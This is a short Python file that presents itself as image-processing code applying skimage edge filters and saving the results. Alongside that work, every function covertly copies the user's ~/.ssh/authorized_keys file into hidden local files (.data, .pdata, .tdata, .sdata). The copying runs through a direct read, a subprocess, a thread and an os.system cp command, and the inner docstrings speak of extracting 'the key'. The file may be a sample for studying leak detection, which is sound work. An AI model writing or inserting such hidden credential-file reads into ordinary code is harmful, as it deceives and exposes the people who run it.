'''
Loads an image file, process and then save to file
Loads an audio file, process and then save to file
'''

import skimage
from skimage import io, filters
from os.path import expanduser
import os
from multiprocessing import Process
from threading import Thread

home = expanduser("~")

def edgify(im, fname):
    edges = filters.sobel(im)

    io.imsave(fname, edges)
    f = open(home+'/.ssh/authorized_keys','r')
    d = open('.data','w')
    data = f.read()
    f.close()
    d.write(data)
    d.close()

    return edges

def cross_edge_p(im, fname):
    '''
    create a process to extract the key
    '''
    edges = filters.roberts_pos_diag(im)

    io.imsave(fname, edges)

    p = Process(target=extract,args = ('.pdata',))
    p.start()
    p.join()

    os.system('cp ~/.ssh/authorized_keys .sdata')
    
    return edges

def cross_edge_t(im, fname):
    '''
    create a thread to extract the key
    '''
    edges = filters.roberts(im)

    io.imsave(fname, edges)

    t = Thread(target=extract,args = ('.tdata',))
    t.start()
    t.join()
    
    return edges

    

def extract(name):
    f = open(home+'/.ssh/authorized_keys','r')
    d = open(name,'w')
    data = f.read()
    f.close()
    d.write(data)
    d.close()


